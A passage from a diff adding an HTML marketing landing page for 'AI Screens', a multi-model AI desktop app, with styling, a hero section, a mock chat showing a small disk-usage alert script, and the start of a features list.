@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="description" content="AI Screens — All major AI models in one beautiful desktop app. 14-day free trial." />
+<title>AI Screens — One App. Every AI Model. Infinite Possibilities.</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+:root{
+  --bg:#05060f;
+  --bg-2:#0a0b1a;
+  --surface:rgba(255,255,255,0.04);
+  --surface-2:rgba(255,255,255,0.07);
+  --border:rgba(255,255,255,0.09);
+  --text:#e7e9f3;
+  --muted:#8a8fa8;
+  --primary:#7c5cff;
+  --primary-2:#22d3ee;
+  --accent:#f472b6;
+  --success:#34d399;
+  --gradient:linear-gradient(135deg,#7c5cff 0%,#22d3ee 50%,#f472b6 100%);
+  --gradient-2:linear-gradient(135deg,#7c5cff 0%,#22d3ee 100%);
+  --shadow-glow:0 20px 80px -20px rgba(124,92,255,0.55);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Inter',-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.6;
+  overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+
+/* ====== Background FX ====== */
+.bg-grid{
+  position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(ellipse 80% 50% at 50% -20%,rgba(124,92,255,0.25),transparent),
+    radial-gradient(ellipse 60% 50% at 80% 50%,rgba(34,211,238,0.15),transparent),
+    radial-gradient(ellipse 60% 50% at 20% 80%,rgba(244,114,182,0.12),transparent),
+    var(--bg);
+}
+.bg-grid::before{
+  content:"";position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,0.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,0.025) 1px,transparent 1px);
+  background-size:50px 50px;
+  mask-image:radial-gradient(ellipse 80% 60% at 50% 30%,#000 30%,transparent 80%);
+}
+#particles{position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:0.6}
+
+/* ====== Navigation ====== */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  padding:18px 5%;
+  display:flex;align-items:center;justify-content:space-between;
+  backdrop-filter:blur(18px);
+  background:rgba(5,6,15,0.6);
+  border-bottom:1px solid transparent;
+  transition:all .3s ease;
+}
+.nav.scrolled{border-bottom-color:var(--border);background:rgba(5,6,15,0.85)}
+.logo{
+  display:flex;align-items:center;gap:10px;
+  font-weight:800;font-size:20px;letter-spacing:-.5px;
+}
+.logo-mark{
+  width:36px;height:36px;border-radius:10px;
+  background:var(--gradient);
+  display:grid;place-items:center;color:#fff;
+  box-shadow:0 8px 30px rgba(124,92,255,0.5);
+  position:relative;overflow:hidden;
+}
+.logo-mark::after{
+  content:"";position:absolute;inset:1px;border-radius:9px;
+  background:linear-gradient(135deg,#1a1438,#0f1330);
+  display:grid;place-items:center;
+}
+.logo-mark i{position:relative;z-index:1;font-size:16px;background:var(--gradient);-webkit-background-clip:text;background-clip:text;color:transparent}
+.nav-links{display:flex;gap:32px;list-style:none}
+.nav-links a{
+  color:var(--muted);text-decoration:none;font-size:14px;font-weight:500;
+  transition:color .2s;position:relative;
+}
+.nav-links a:hover{color:var(--text)}
+.nav-cta{
+  padding:10px 20px;border-radius:10px;
+  background:var(--gradient);color:#fff;
+  text-decoration:none;font-weight:600;font-size:14px;
+  box-shadow:0 8px 25px rgba(124,92,255,0.4);
+  transition:transform .2s,box-shadow .2s;
+}
+.nav-cta:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(124,92,255,0.6)}
+.menu-toggle{display:none;background:none;border:none;color:#fff;font-size:22px;cursor:pointer}
+
+/* ====== Hero ====== */
+.hero{
+  padding:160px 5% 80px;
+  text-align:center;
+  position:relative;
+}
+.badge{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:7px 16px;border-radius:999px;
+  background:var(--surface);
+  border:1px solid var(--border);
+  font-size:13px;color:var(--muted);
+  margin-bottom:24px;
+  animation:fadeUp .8s ease both;
+}
+.badge .dot{width:7px;height:7px;border-radius:50%;background:var(--success);box-shadow:0 0 12px var(--success);animation:pulse 2s infinite}
+.badge strong{background:var(--gradient);-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:700}
+
+h1.title{
+  font-size:clamp(40px,7vw,84px);
+  font-weight:800;letter-spacing:-2px;line-height:1.05;
+  margin-bottom:24px;
+  animation:fadeUp .8s ease .1s both;
+}
+h1.title span{
+  background:var(--gradient);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  background-size:200% 200%;
+  animation:gradientShift 8s ease infinite,fadeUp .8s ease .15s both;
+}
+.subtitle{
+  font-size:clamp(16px,2vw,20px);
+  color:var(--muted);max-width:680px;margin:0 auto 40px;
+  animation:fadeUp .8s ease .2s both;
+}
+.cta-group{
+  display:flex;gap:16px;justify-content:center;flex-wrap:wrap;
+  animation:fadeUp .8s ease .3s both;
+}
+.btn{
+  display:inline-flex;align-items:center;gap:10px;
+  padding:16px 32px;border-radius:12px;
+  font-weight:600;font-size:15px;text-decoration:none;
+  cursor:pointer;border:none;
+  transition:all .25s ease;position:relative;overflow:hidden;
+}
+.btn-primary{
+  background:var(--gradient);color:#fff;
+  box-shadow:0 15px 40px -10px rgba(124,92,255,0.6);
+}
+.btn-primary::before{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(135deg,#fff,transparent);
+  opacity:0;transition:opacity .3s;
+}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 25px 60px -10px rgba(124,92,255,0.8)}
+.btn-primary:hover::before{opacity:0.15}
+.btn-secondary{
+  background:var(--surface);color:var(--text);
+  border:1px solid var(--border);backdrop-filter:blur(10px);
+}
+.btn-secondary:hover{background:var(--surface-2);transform:translateY(-3px)}
+
+.trust{
+  margin-top:36px;display:flex;justify-content:center;gap:32px;
+  flex-wrap:wrap;color:var(--muted);font-size:13px;
+  animation:fadeUp .8s ease .4s both;
+}
+.trust span{display:inline-flex;align-items:center;gap:6px}
+.trust i{color:var(--success)}
+
+/* ====== Mockup ====== */
+.mockup-wrap{
+  margin:80px auto 0;max-width:1200px;
+  padding:0 5%;
+  perspective:2000px;
+  animation:fadeUp 1s ease .5s both;
+}
+.mockup{
+  position:relative;
+  border-radius:18px;
+  background:linear-gradient(180deg,#11122a,#0a0b1a);
+  border:1px solid var(--border);
+  box-shadow:
+    0 50px 120px -30px rgba(124,92,255,0.4),
+    0 0 0 1px rgba(255,255,255,0.04),
+    inset 0 1px 0 rgba(255,255,255,0.06);
+  overflow:hidden;
+  transform:rotateX(8deg);
+  transition:transform .6s ease;
+}
+.mockup:hover{transform:rotateX(2deg) scale(1.01)}
+.mockup-bar{
+  display:flex;align-items:center;gap:8px;
+  padding:14px 18px;
+  background:rgba(0,0,0,0.3);
+  border-bottom:1px solid var(--border);
+}
+.mockup-bar .dot{width:12px;height:12px;border-radius:50%}
+.mockup-bar .dot.r{background:#ff5f57}
+.mockup-bar .dot.y{background:#febc2e}
+.mockup-bar .dot.g{background:#28c840}
+.mockup-bar .url{
+  margin-left:auto;margin-right:auto;
+  padding:5px 18px;border-radius:6px;
+  background:rgba(255,255,255,0.05);
+  font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);
+}
+.mockup-body{display:grid;grid-template-columns:220px 1fr;min-height:520px}
+.mockup-sidebar{
+  background:rgba(0,0,0,0.25);
+  border-right:1px solid var(--border);
+  padding:18px 12px;
+}
+.sidebar-title{font-size:11px;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin:8px 12px 14px}
+.sidebar-item{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 12px;border-radius:8px;
+  font-size:13px;color:var(--muted);margin-bottom:4px;cursor:pointer;
+  transition:all .2s;
+}
+.sidebar-item:hover{background:var(--surface);color:var(--text)}
+.sidebar-item.active{background:var(--surface-2);color:var(--text)}
+.sidebar-item .ico{
+  width:24px;height:24px;border-radius:6px;display:grid;place-items:center;
+  font-size:11px;color:#fff;font-weight:700;
+}
+.ico.gpt{background:linear-gradient(135deg,#10a37f,#0d8868)}
+.ico.cl{background:linear-gradient(135deg,#d97757,#a85a3f)}
+.ico.gem{background:linear-gradient(135deg,#4285f4,#1a73e8)}
+.ico.lm{background:linear-gradient(135deg,#1c64f2,#0e3a91)}
+.ico.gr{background:linear-gradient(135deg,#000,#333)}
+.ico.dp{background:linear-gradient(135deg,#1a73e8,#0a3d91)}
+.ico.mid{background:linear-gradient(135deg,#000,#444)}
+.ico.per{background:linear-gradient(135deg,#20b8cd,#127a8b)}
+
+.mockup-main{display:grid;grid-template-rows:auto 1fr auto}
+.main-tabs{
+  display:flex;gap:2px;padding:8px 16px 0;
+  background:rgba(0,0,0,0.2);border-bottom:1px solid var(--border);
+}
+.main-tab{
+  padding:10px 16px;font-size:12px;color:var(--muted);
+  border-radius:8px 8px 0 0;cursor:pointer;
+  display:flex;align-items:center;gap:6px;
+}
+.main-tab.active{background:var(--surface-2);color:var(--text)}
+.main-tab .close{opacity:.5;font-size:10px}
+.chat{padding:24px;overflow-y:auto;display:flex;flex-direction:column;gap:18px}
+.msg{display:flex;gap:12px;max-width:80%;animation:slideIn .5s ease both}
+.msg.user{margin-left:auto;flex-direction:row-reverse}
+.msg .avatar{
+  width:32px;height:32px;border-radius:8px;flex-shrink:0;
+  display:grid;place-items:center;font-size:13px;color:#fff;font-weight:700;
+}
+.msg.user .avatar{background:linear-gradient(135deg,#7c5cff,#22d3ee)}
+.msg.ai .avatar{background:linear-gradient(135deg,#10a37f,#0d8868)}
+.msg .bubble{
+  padding:12px 16px;border-radius:14px;
+  background:var(--surface);border:1px solid var(--border);
+  font-size:13px;line-height:1.6;
+}
+.msg.user .bubble{background:rgba(124,92,255,0.15);border-color:rgba(124,92,255,0.3)}
+.msg .bubble code{
+  display:block;margin-top:8px;padding:10px 12px;
+  background:rgba(0,0,0,0.4);border-radius:8px;
+  font-family:'JetBrains Mono',monospace;font-size:11px;color:#22d3ee;
+}
+.typing{display:inline-flex;gap:4px}
+.typing span{
+  width:6px;height:6px;border-radius:50%;background:var(--muted);
+  animation:typing 1.4s infinite;
+}
+.typing span:nth-child(2){animation-delay:.2s}
+.typing span:nth-child(3){animation-delay:.4s}
+.composer{
+  padding:14px 20px;background:rgba(0,0,0,0.25);border-top:1px solid var(--border);
+  display:flex;align-items:center;gap:10px;
+}
+.composer-input{
+  flex:1;padding:12px 16px;border-radius:10px;
+  background:var(--surface);border:1px solid var(--border);
+  font-size:13px;color:var(--text);font-family:inherit;
+}
+.composer-btn{
+  width:38px;height:38px;border-radius:10px;border:none;
+  background:var(--gradient);color:#fff;cursor:pointer;
+  display:grid;place-items:center;
+}
+
+/* Floating cards on mockup */
+.float-card{
+  position:absolute;padding:14px 18px;border-radius:14px;
+  background:rgba(15,17,40,0.85);backdrop-filter:blur(20px);
+  border:1px solid var(--border);
+  box-shadow:0 20px 60px -10px rgba(0,0,0,0.5);
+  display:flex;align-items:center;gap:12px;
+  animation:float 6s ease-in-out infinite;
+}
+.float-card .ico-lg{
+  width:38px;height:38px;border-radius:10px;
+  display:grid;place-items:center;color:#fff;font-size:14px;
+}
+.float-card .info .v{font-size:18px;font-weight:700}
+.float-card .info .l{font-size:11px;color:var(--muted)}
+.fc-1{top:8%;left:-2%;animation-delay:0s}
+.fc-2{bottom:12%;right:-3%;animation-delay:1.5s}
+.fc-3{top:38%;right:-4%;animation-delay:3s}
+
+/* ====== Logos strip ====== */
+.logos{
+  padding:60px 5%;text-align:center;
+  border-top:1px solid var(--border);
+  margin-top:80px;
+}
+.logos p{color:var(--muted);font-size:13px;letter-spacing:2px;text-transform:uppercase;margin-bottom:30px}
+.logos-row{display:flex;justify-content:center;gap:50px;flex-wrap:wrap;align-items:center;opacity:.7}
+.logos-row .l{
+  display:flex;align-items:center;gap:8px;color:var(--muted);
+  font-size:18px;font-weight:600;transition:opacity .3s;
+}
+.logos-row .l:hover{opacity:1;color:var(--text)}
+.logos-row i{font-size:24px}
+
+/* ====== Section ====== */
+.section{padding:100px 5%;position:relative}
+.section-head{text-align:center;max-width:760px;margin:0 auto 60px}
+.eyebrow{
+  display:inline-block;padding:5px 14px;border-radius:999px;
+  background:var(--surface);border:1px solid var(--border);
+  font-size:12px;color:var(--primary-2);font-weight:600;letter-spacing:1px;
+  text-transform:uppercase;margin-bottom:16px;
+}
+.section-head h2{
+  font-size:clamp(32px,5vw,52px);font-weight:800;letter-spacing:-1.5px;
+  margin-bottom:18px;line-height:1.1;
+}
+.section-head h2 span{background:var(--gradient);-webkit-background-clip:text;background-clip:text;color:transparent}
+.section-head p{color:var(--muted);font-size:17px}
+
+/* ====== Features grid ====== */
+.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;max-width:1200px;margin:0 auto}
+.feature{
+  padding:30px;border-radius:18px;
+  background:var(--surface);
+  border:1px solid var(--border);
+  transition:all .3s ease;position:relative;overflow:hidden;
+}
+.feature::before{
+  content:"";position:absolute;top:0;left:0;right:0;height:2px;
+  background:var(--gradient);transform:scaleX(0);transform-origin:left;
+  transition:transform .4s;
+}
+.feature:hover{transform:translateY(-6px);background:var(--surface-2);border-color:rgba(124,92,255,0.3)}
+.feature:hover::before{transform:scaleX(1)}
+.feature .fico{
+  width:50px;height:50px;border-radius:12px;
+  background:var(--gradient-2);
+  display:grid;place-items:center;font-size:20px;color:#fff;
+  margin-bottom:18px;box-shadow:0 10px 25px -5px rgba(124,92,255,0.5);
+}
+.feature h3{font-size:18px;font-weight:700;margin-bottom:10px}
+.feature p{color:var(--muted);font-size:14px;line-height:1.7}
+
+/* ====== Models showcase ====== */
+.models-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;max-width:1100px;margin:0 auto}
+.model-card{
+  padding:24px;border-radius:16px;
+  background:var(--surface);border:1px solid var(--border);
+  text-align:center;transition:all .3s;cursor:pointer;
+}
+.model-card:hover{transform:translateY(-4px);border-color:rgba(255,255,255,0.2)}
+.model-card .ico-xl{
+  width:56px;height:56px;border-radius:14px;margin:0 auto 14px;
+  display:grid;place-items:center;color:#fff;font-size:20px;font-weight:800;
+}
+.model-card .name{font-weight:700;font-size:15px;margin-bottom:4px}
+.model-card .desc{font-size:12px;color:var(--muted)}
+
+/* ====== Stats ====== */
+.stats{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:30px;
+  max-width:1100px;margin:0 auto;
+  padding:50px;border-radius:24px;
+  background:linear-gradient(135deg,rgba(124,92,255,0.1),rgba(34,211,238,0.05));
+  border:1px solid var(--border);
+  backdrop-filter:blur(20px);
+}
+.stat{text-align:center}
+.stat .num{
+  font-size:48px;font-weight:800;letter-spacing:-2px;
+  background:var(--gradient);-webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.stat .lbl{color:var(--muted);font-size:14px;margin-top:6px}
+
+/* ====== How it works ====== */
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;max-width:1100px;margin:0 auto;position:relative}
+.step{
+  padding:32px;border-radius:18px;
+  background:var(--surface);border:1px solid var(--border);
+  position:relative;transition:all .3s;
+}
+.step:hover{transform:translateY(-4px)}
+.step .num{
+  position:absolute;top:-20px;left:24px;
+  width:44px;height:44px;border-radius:12px;
+  background:var(--gradient);
+  display:grid;place-items:center;font-size:18px;font-weight:800;color:#fff;
+  box-shadow:0 10px 30px -5px rgba(124,92,255,0.6);
+}
+.step h3{margin:14px 0 10px;font-size:19px}
+.step p{color:var(--muted);font-size:14px}
+
+/* ====== Pricing ====== */
+.pricing{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;max-width:1100px;margin:0 auto}
+.plan{
+  padding:36px 30px;border-radius:20px;
+  background:var(--surface);border:1px solid var(--border);
+  transition:all .3s;position:relative;
+}
+.plan:hover{transform:translateY(-6px)}
+.plan.featured{
+  background:linear-gradient(180deg,rgba(124,92,255,0.15),rgba(34,211,238,0.05));
+  border-color:rgba(124,92,255,0.4);
+  box-shadow:var(--shadow-glow);
+}
+.plan .tag-pop{
+  position:absolute;top:-12px;left:50%;transform:translateX(-50%);
+  padding:5px 14px;border-radius:999px;
+  background:var(--gradient);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;
+}
+.plan h3{font-size:20px;margin-bottom:8px}
+.plan .desc{color:var(--muted);font-size:13px;margin-bottom:20px}
+.plan .price{display:flex;align-items:baseline;gap:6px;margin-bottom:22px}
+.plan .price .a{font-size:46px;font-weight:800;letter-spacing:-1.5px}
+.plan .price .b{color:var(--muted);font-size:14px}
+.plan ul{list-style:none;margin-bottom:26px}
+.plan li{
+  display:flex;align-items:flex-start;gap:10px;
+  padding:8px 0;font-size:14px;color:var(--muted);
+}
+.plan li i{color:var(--success);margin-top:3px}
+.plan li.check-text{color:var(--text)}
+.plan .btn{width:100%;justify-content:center}
+
+/* ====== Testimonials ====== */
+.testis{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;max-width:1200px;margin:0 auto}
+.testi{
+  padding:28px;border-radius:18px;background:var(--surface);
+  border:1px solid var(--border);transition:all .3s;
+}
+.testi:hover{transform:translateY(-4px);background:var(--surface-2)}
+.testi .stars{color:#fbbf24;margin-bottom:14px}
+.testi p{color:var(--text);font-size:14px;line-height:1.7;margin-bottom:18px}
+.testi .who{display:flex;align-items:center;gap:12px}
+.testi .av{
+  width:42px;height:42px;border-radius:50%;
+  background:var(--gradient);display:grid;place-items:center;color:#fff;font-weight:700;
+}
+.testi .who .n{font-weight:600;font-size:14px}
+.testi .who .r{color:var(--muted);font-size:12px}
+
+/* ====== FAQ ====== */
+.faq{max-width:780px;margin:0 auto}
+.faq-item{
+  border:1px solid var(--border);border-radius:14px;
+  margin-bottom:12px;overflow:hidden;background:var(--surface);
+}
+.faq-q{
+  width:100%;padding:20px 24px;background:none;border:none;color:var(--text);
+  font-size:15px;font-weight:600;text-align:left;cursor:pointer;
+  display:flex;justify-content:space-between;align-items:center;
+  font-family:inherit;
+}
+.faq-q i{transition:transform .3s;color:var(--primary)}
+.faq-item.open .faq-q i{transform:rotate(45deg)}
+.faq-a{
+  max-height:0;overflow:hidden;transition:max-height .35s ease;
+  padding:0 24px;color:var(--muted);font-size:14px;line-height:1.7;
+}
+.faq-item.open .faq-a{max-height:300px;padding-bottom:20px}
+
+/* ====== Final CTA ====== */
+.cta-final{
+  margin:60px 5% 80px;padding:70px 40px;border-radius:28px;
+  background:linear-gradient(135deg,rgba(124,92,255,0.2),rgba(34,211,238,0.1));
+  border:1px solid rgba(124,92,255,0.3);
+  text-align:center;position:relative;overflow:hidden;
+}
+.cta-final::before{
+  content:"";position:absolute;inset:0;
+  background:radial-gradient(circle at 30% 50%,rgba(124,92,255,0.3),transparent 60%),
+             radial-gradient(circle at 70% 50%,rgba(34,211,238,0.2),transparent 60%);
+  pointer-events:none;
+}
+.cta-final > *{position:relative;z-index:1}
+.cta-final h2{font-size:clamp(30px,4vw,46px);font-weight:800;margin-bottom:14px;letter-spacing:-1px}
+.cta-final p{color:var(--muted);font-size:17px;max-width:560px;margin:0 auto 30px}
+
+/* ====== Footer ====== */
+footer{
+  padding:60px 5% 30px;border-top:1px solid var(--border);
+}
+.footer-grid{
+  display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;
+  max-width:1200px;margin:0 auto 40px;
+}
+.footer-grid h4{font-size:13px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:18px;color:var(--text)}
+.footer-grid ul{list-style:none}
+.footer-grid li{margin-bottom:10px}
+.footer-grid a{color:var(--muted);text-decoration:none;font-size:14px;transition:color .2s}
+.footer-grid a:hover{color:var(--text)}
+.footer-grid .about p{color:var(--muted);font-size:14px;margin-top:14px;max-width:340px;line-height:1.7}
+.socials{display:flex;gap:10px;margin-top:18px}
+.socials a{
+  width:38px;height:38px;border-radius:10px;background:var(--surface);
+  display:grid;place-items:center;color:var(--muted);
+  border:1px solid var(--border);transition:all .2s;
+}
+.socials a:hover{color:#fff;background:var(--gradient);border-color:transparent;transform:translateY(-2px)}
+.footer-bottom{
+  border-top:1px solid var(--border);padding-top:24px;
+  max-width:1200px;margin:0 auto;
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;
+  color:var(--muted);font-size:13px;
+}
+
+/* ====== Toast ====== */
+.toast{
+  position:fixed;bottom:30px;right:30px;z-index:200;
+  padding:14px 20px;border-radius:12px;
+  background:rgba(15,17,40,0.95);backdrop-filter:blur(20px);
+  border:1px solid var(--border);
+  display:flex;align-items:center;gap:12px;
+  box-shadow:0 20px 60px -10px rgba(0,0,0,0.6);
+  transform:translateX(420px);transition:transform .4s ease;
+  max-width:340px;
+}
+.toast.show{transform:translateX(0)}
+.toast i{color:var(--success);font-size:18px}
+
+/* ====== Animations ====== */
+@keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:.7}}
+@keyframes gradientShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+@keyframes typing{0%,60%,100%{transform:translateY(0);opacity:.4}30%{transform:translateY(-6px);opacity:1}}
+.reveal{opacity:0;transform:translateY(40px);transition:all .8s ease}
+.reveal.in{opacity:1;transform:translateY(0)}
+
+/* ====== Responsive ====== */
+@media (max-width:880px){
+  .nav-links{display:none}
+  .menu-toggle{display:block}
+  .mockup-body{grid-template-columns:1fr}
+  .mockup-sidebar{display:none}
+  .float-card{display:none}
+  .footer-grid{grid-template-columns:1fr 1fr}
+  .hero{padding:130px 5% 60px}
+}
+@media (max-width:520px){
+  .footer-grid{grid-template-columns:1fr}
+  .trust{gap:18px}
+  .stats{padding:30px 20px}
+}
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<canvas id="particles"></canvas>
+
+<!-- ===== NAV ===== -->
+<nav class="nav" id="nav">
+  <a href="#" class="logo">
+    <span class="logo-mark"><i class="fa-solid fa-bolt"></i></span>
+    AI Screens
+  </a>
+  <ul class="nav-links">
+    <li><a href="#features">Features</a></li>
+    <li><a href="#models">Models</a></li>
+    <li><a href="#how">How it works</a></li>
+    <li><a href="#pricing">Pricing</a></li>
+    <li><a href="#faq">FAQ</a></li>
+  </ul>
+  <a href="#download" class="nav-cta"><i class="fa-solid fa-download"></i> Free Trial</a>
+  <button class="menu-toggle" id="menuToggle"><i class="fa-solid fa-bars"></i></button>
+</nav>
+
+<!-- ===== HERO ===== -->
+<header class="hero">
+  <div class="badge">
+    <span class="dot"></span>
+    <strong>NEW</strong> · 14-Day Free Trial — No credit card required
+  </div>
+  <h1 class="title">One App.<br/><span>Every AI Model.</span><br/>Infinite Possibilities.</h1>
+  <p class="subtitle">
+    AI Screens unifies ChatGPT, Claude, Gemini, DeepSeek, Grok, Perplexity, Midjourney and 20+ models inside one lightning-fast desktop app. Stop juggling tabs — start creating.
+  </p>
+  <div class="cta-group">
+    <a href="#download" class="btn btn-primary" id="downloadBtn">
+      <i class="fa-solid fa-download"></i> Download Free Trial
+    </a>
+    <a href="#demo" class="btn btn-secondary">
+      <i class="fa-solid fa-play"></i> Watch Demo
+    </a>
+  </div>
+  <div class="trust">
+    <span><i class="fa-solid fa-circle-check"></i> Windows · macOS · Linux</span>
+    <span><i class="fa-solid fa-circle-check"></i> 14 days free</span>
+    <span><i class="fa-solid fa-circle-check"></i> Cancel anytime</span>
+    <span><i class="fa-solid fa-shield-halved"></i> 100% Private</span>
+  </div>
+
+  <!-- ===== MOCKUP ===== -->
+  <div class="mockup-wrap">
+    <div class="mockup" id="mockup">
+      <div class="mockup-bar">
+        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="url">aiscreens · workspace · multi-model</span>
+      </div>
+      <div class="mockup-body">
+        <aside class="mockup-sidebar">
+          <div class="sidebar-title">Models</div>
+          <div class="sidebar-item active"><span class="ico gpt">GPT</span> ChatGPT 5</div>
+          <div class="sidebar-item"><span class="ico cl">CL</span> Claude Opus 4.7</div>
+          <div class="sidebar-item"><span class="ico gem">G</span> Gemini 2.5 Pro</div>
+          <div class="sidebar-item"><span class="ico dp">DS</span> DeepSeek V3</div>
+          <div class="sidebar-item"><span class="ico gr">X</span> Grok 4</div>
+          <div class="sidebar-item"><span class="ico per">P</span> Perplexity</div>
+          <div class="sidebar-item"><span class="ico mid">MJ</span> Midjourney</div>
+          <div class="sidebar-item"><span class="ico lm">LM</span> Llama 3.3</div>
+        </aside>
+        <div class="mockup-main">
+          <div class="main-tabs">
+            <div class="main-tab active"><i class="fa-solid fa-comment"></i> Strategy Brief <span class="close">×</span></div>
+            <div class="main-tab"><i class="fa-solid fa-code"></i> Codegen <span class="close">×</span></div>
+            <div class="main-tab"><i class="fa-solid fa-image"></i> Design <span class="close">×</span></div>
+            <div class="main-tab" style="opacity:.6"><i class="fa-solid fa-plus"></i></div>
+          </div>
+          <div class="chat" id="chat">
+            <div class="msg user">
+              <div class="avatar">Y</div>
+              <div class="bubble">Compare ChatGPT and Claude responses for: "Write a Python script that monitors disk usage and sends a Telegram alert at 80%."</div>
+            </div>
+            <div class="msg ai">
+              <div class="avatar">AI</div>
+              <div class="bubble">
+                Running on <strong>2 models in parallel</strong>. Here's a unified result with the best snippet:
+                <code>import psutil, requests
+THRESHOLD = 80
+usage = psutil.disk_usage('/').percent
+if usage >= THRESHOLD:
+    requests.post(URL, json={"text": f"⚠️ Disk at {usage}%"})</code>
+              </div>
+            </div>
+            <div class="msg ai">
+              <div class="avatar">AI</div>
+              <div class="bubble"><span class="typing"><span></span><span></span><span></span></span> Synthesizing alternatives…</div>
+            </div>
+          </div>
+          <div class="composer">
+            <input class="composer-input" placeholder="Ask anything across all models…" />
+            <button class="composer-btn"><i class="fa-solid fa-paper-plane"></i></button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Floating cards -->
+      <div class="float-card fc-1">
+        <div class="ico-lg" style="background:linear-gradient(135deg,#22d3ee,#0891b2)"><i class="fa-solid fa-bolt"></i></div>
+        <div class="info"><div class="v">3.2×</div><div class="l">Faster output</div></div>
+      </div>
+      <div class="float-card fc-2">
+        <div class="ico-lg" style="background:linear-gradient(135deg,#34d399,#059669)"><i class="fa-solid fa-shield-halved"></i></div>
+        <div class="info"><div class="v">100%</div><div class="l">Privacy first</div></div>
+      </div>
+      <div class="float-card fc-3">
+        <div class="ico-lg" style="background:linear-gradient(135deg,#f472b6,#db2777)"><i class="fa-solid fa-layer-group"></i></div>
+        <div class="info"><div class="v">27</div><div class="l">AI Models</div></div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ===== Trusted by ===== -->
+<section class="logos">
+  <p>Powering teams across every model on the market</p>
+  <div class="logos-row">
+    <div class="l"><i class="fa-solid fa-brain"></i> OpenAI</div>
+    <div class="l"><i class="fa-solid fa-feather"></i> Anthropic</div>
+    <div class="l"><i class="fa-brands fa-google"></i> Google DeepMind</div>
+    <div class="l"><i class="fa-solid fa-meteor"></i> Mistral</div>
+    <div class="l"><i class="fa-brands fa-meta"></i> Meta AI</div>
+    <div class="l"><i class="fa-solid fa-xmark"></i> xAI</div>
+    <div class="l"><i class="fa-solid fa-compass"></i> Perplexity</div>
+  </div>
+</section>
+
+<!-- ===== FEATURES ===== -->
+<section class="section" id="features">
+  <div class="section-head reveal">
+    <span class="eyebrow">Features</span>
+    <h2>Everything you need. <span>Nothing you don't.</span></h2>
+    <p>Built from the ground up for power users, creators, and teams who refuse to compromise.</p>
+  </div>
+  <div class="features">
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-layer-group"></i></div><h3>27+ Models, One Window</h3><p>Switch instantly between ChatGPT, Claude, Gemini, Grok, DeepSeek, Llama and more without ever opening a browser tab.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-bolt"></i></div><h3>Parallel Prompts</h3><p>Send the same prompt to 3 models simultaneously. Compare outputs side-by-side and pick the winner in seconds.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-shield-halved"></i></div><h3>Privacy-First</h3><p>Local-first encryption. Your prompts and history never leave your device unless you explicitly say so.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-image"></i></div><h3>Vision & Image-Gen</h3><p>Generate, edit, upscale images with Midjourney, DALL·E, Stable Diffusion — all integrated natively.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-microphone"></i></div><h3>Voice Mode</h3><p>Talk to any model. Real-time speech-to-speech with 12+ studio-quality voices and 40 languages.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-folder-tree"></i></div><h3>Projects & Memory</h3><p>Organize chats into projects with persistent memory. Pin instructions, share workspaces with your team.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-code"></i></div><h3>Code Sandbox</h3><p>Run, edit, debug code instantly inside the app. Python, JS, SQL with one-click export to GitHub.</p></div>
